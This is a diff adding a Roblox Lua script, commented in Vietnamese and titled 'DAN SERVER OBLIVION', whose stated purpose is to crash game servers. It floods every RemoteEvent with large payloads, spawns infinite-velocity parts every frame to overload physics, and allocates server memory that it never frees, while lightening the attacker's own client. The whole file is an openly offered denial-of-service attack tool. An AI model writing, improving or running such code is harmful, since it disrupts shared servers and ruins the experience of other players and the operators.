@@ -1,0 +1,70 @@
+-- DAN SERVER OBLIVION v10.0 - THE END OF THE SERVER
+local RunService = game:GetService("RunService")
+local Network = game:GetService("NetworkClient")
+
+print("💀 HỆ THỐNG HỦY DIỆT ĐÃ SẴN SÀNG. SERVER SẼ SẬP TRONG 5 GIÂY...")
+
+-- 1. CHỐNG TREO MÁY CHO BẢN THÂN (BẮT BUỘC)
+task.spawn(function()
+    while task.wait(1) do
+        settings().Network.IncomingReplicationLag = 1000 -- Lừa máy mình là mạng đang rất lag để nó không nhận dữ liệu rác về
+        game:GetService("Lighting").GlobalShadows = false
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then v.CanTouch = false v.CanQuery = false end
+        end
+    end
+end)
+
+-- 2. LÕI HỦY DIỆT 1: REMOTE OVERLOAD (LÀM NGHẼN BĂNG THÔNG)
+local function NetworkCrash()
+    local payload = string.rep("💀DAN_CRASH💀", 5000) -- Tạo cục dữ liệu cực nặng
+    for _, remote in pairs(game:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            task.spawn(function()
+                while true do
+                    -- Bắn liên tục dữ liệu nặng lên mọi RemoteEvent tìm thấy
+                    remote:FireServer(payload, {payload}, math.huge)
+                    task.wait(0.01) -- Độ trễ cực nhỏ để không làm treo Client ngay lập tức
+                end
+            end)
+        end
+    end
+end
+
+-- 3. LÕI HỦY DIỆT 2: PHYSICS ANARCHY (LÀM QUÁ TẢI CPU SERVER)
+local function PhysicsCrash()
+    RunService.Heartbeat:Connect(function()
+        for i = 1, 50 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(0.001, 0.001, 0.001) -- Nhỏ nhưng số lượng lớn
+                p.CustomPhysicalProperties = PhysicalProperties.new(100, 100, 100, 100, 100)
+                p.Velocity = Vector3.new(math.huge, math.huge, math.huge)
+                p.Parent = workspace
+                -- Ép Server tính toán va chạm liên tục
+                task.delay(0.1, function() p:Destroy() end)
+            end)
+        end
+    end)
+end
+
+-- 4. LÕI HỦY DIỆT 3: MEMORY LEAK (LÀM TRÀN BỘ NHỚ SERVER)
+local function MemoryCrash()
+    task.spawn(function()
+        while true do
+            local folder = Instance.new("Folder", game.ReplicatedStorage)
+            for i = 1, 1000 do
+                Instance.new("StringValue", folder).Value = string.rep("LAG", 10000)
+            end
+            task.wait(0.5)
+            -- Không xóa folder cũ, để bộ nhớ server tăng dần đến khi sập
+        end
+    end)
+end
+
+-- KÍCH NỔ TỔNG LỰC
+task.spawn(NetworkCrash)
+task.spawn(PhysicsCrash)
+task.spawn(MemoryCrash)
+
+warn("🔥 SERVER ĐANG CHẾT. ENJOY THE SILENCE!")
